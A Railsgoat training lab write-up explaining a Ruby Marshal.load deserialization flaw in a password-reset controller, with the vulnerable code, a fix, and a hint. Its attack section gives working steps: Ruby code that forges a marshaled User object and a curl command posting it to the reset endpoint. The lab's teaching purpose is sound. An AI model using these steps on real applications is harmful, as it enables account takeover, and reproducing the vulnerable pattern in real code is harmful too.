## Remote Code Execution

[Remote Code Execution](https://www.owasp.org/index.php/Code_Injection)

[Ruby Marshal Security Considerations](http://ruby-doc.org/core-2.1.3/Marshal.html#module-Marshal-label-Security+considerations)

Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data. 

# Bug

Railsgoat includes a remote code execution vulnerability through Ruby's Marshal.load vulnerability. Ruby's Marshal.load also the deserialization of arbitrary objects. The password reset controller includes a deserialization vulnerability. During the forgot password flow, after the user clicks on the reset email link, the application verifies the token then adds a Marshaled user object which is posted during the password reset. 

Within reset_password.html.erb
```
          <div class="content">
            <%= hidden_field_tag 'user', Base64.encode64(Marshal.dump(@user)) %>
            <%= label_tag "Enter Password" %>
            <%= password_field_tag :password, params[:password], {:class => "input input-block-level"} %>
            <%= label_tag "Confirm Password" %>
            <%= password_field_tag :confirm_password, params[:confirm_password], {:class => "input input-block-level"} %>
          </div>
```
Within password_resets_controller.rb
```
  def reset_password
    user = Marshal.load(Base64.decode64(params[:user])) unless params[:user].nil?

    if user && params[:password] && params[:confirm_password] && params[:password] == params[:confirm_password]
      user.password = params[:password]
      user.save!
      flash[:success] = "Your password has been reset please login"
      redirect_to :login
    else
      flash[:error] = "Error resetting your password. Please try again."
      redirect_to :login
    end
  end
```

# Solution

### Remote Code Execution - ATTACK
```
# Dump an ActiveRecord object with the needed attributes for a User.
# This can be done in the railsgoat project or from another Rails 3.2 project by
# creating a User class with the required fields (id, user_id, created_at, updated_at) 
# and the additional fields you want to change.

# Assuming a table named 'users' with id, user_id, created_at, updated_at, and email 
# as columns exists
class User < ActiveRecord::Base; end
user = User.new(id: 5, user_id: 5)
user.save
user.email = 'new-email@domain.tld'

# Loading an existing user if in the railsgoat rails console will also work
# user = User.last
# user.email = "new-email@domain.tld"

Base64.strict_encode64(Marshal.dump(user))
# => "BAhvOglVc2VyEDoQQGF0...
```
`curl --data "user=<base64_encoded_object>&password=password&confirm_password=password" http://localhost:3000/password_resets`

### Remote Code Execution - SOLUTION

Applications should never use Marshal load with user input. If possible Marshal load should not be used in an application. Other forms of serialization can be used such as json.

# Hint

What does the password reset screen have in the source?